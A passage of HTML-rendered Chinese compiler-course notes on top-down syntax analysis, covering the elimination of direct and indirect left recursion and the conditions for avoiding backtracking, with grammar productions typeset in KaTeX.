id="%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%AD%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95" tabindex="-1">自上而下语法分析中问题的解决方法</h4><ul><li>无限循环：消除左递归</li><li>回溯：避免回溯</li></ul><h3 id="2-%E5%B7%A6%E9%80%92%E5%BD%92%E7%9A%84%E6%B6%88%E9%99%A4" tabindex="-1">2 左递归的消除</h3><h4 id="%E7%9B%B4%E6%8E%A5%E5%B7%A6%E9%80%92%E5%BD%92%E7%9A%84%E6%B6%88%E9%99%A4" tabindex="-1">直接左递归的消除</h4><p>设有产生式 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><mi>A</mi><msub><mi>α</mi><mi>m</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A \rightarrow Aα_1|Aα_2|…|Aα_m|β_1|β_2|…|β_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>1</mn><mtext>，</mtext><mn>2</mn><mtext>，</mtext><mo>…</mo><mtext>，</mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y_i(i=1，2，…，n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>均不以符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>为首，增加新非终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>U</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">U^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></eq>，将上述产生式变换为:<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>β</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>β</mi><mi>n</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">A→β_1A^{&#x27;}|β_2A^{&#x27;}|…|β_nA^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1925em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0528em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mi>m</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mi mathvariant="normal">∣</mi><mi>ε</mi></mrow><annotation encoding="application/x-tex">A^{&#x27;}→α_1A^{&#x27;}|α_2A^{&#x27;}|…|α_mA^{&#x27;}|ε</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1925em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">ε</span></span></span></span></eq></p><h4 id="%E9%97%B4%E6%8E%A5%E5%B7%A6%E9%80%92%E5%BD%92%E7%9A%84%E6%B6%88%E9%99%A4" tabindex="-1">间接左递归的消除</h4><ol><li>以某种顺序将文法非终结符排列<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mn>1</mn></msub><mtext>，</mtext><msub><mi>U</mi><mn>2</mn></msub><mtext>，</mtext><mo>…</mo><mtext>，</mtext><msub><mi>U</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">U_1 ，U_2 ，…，U_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>改写文法;</li><li>化简由2得到的文法。</li></ol><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%B6%88%E9%99%A4%E9%97%B4%E6%8E%A5%E5%B7%A6%E9%80%92%E5%BD%92.jpg" alt="消除间接左递归"></p><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%B6%88%E9%99%A4%E5%B7%A6%E9%80%92%E5%BD%92%E4%BE%8B%E5%AD%90.jpg" alt="消除左递归例子"></p><h3 id="3-%E5%9B%9E%E6%BA%AF%E7%9A%84%E9%81%BF%E5%85%8D" tabindex="-1">3 回溯的避免</h3><h4 id="%E9%81%BF%E5%85%8D%E5%9B%9E%E6%BA%AF%E7%9A%84%E6%9D%A1%E4%BB%B6" tabindex="-1">避免回溯的条件</h4><ul><li>产生原因：<ul><li>文法中存在如下形式的产生式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mo>…</mo><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">U→α_1|α_2|…|α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,且候选式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub><mtext>，</mtext><msub><mi>α</mi><mn>2</mn></msub><mtext>，</mtext><mo>…</mo><mtext>，</mtext><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">α_1，α_2，…，α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中有相同的终结首符号</li></ul></li><li>避免的前提条件：<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>α</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>α</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">α_1, α_2, …, α_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>等各符号串的终结首符号集合总是两两互不相交的</li><li>但当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>j</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">a_j \rightarrow^{*}\epsilon</annotation></semantics></math></span><span 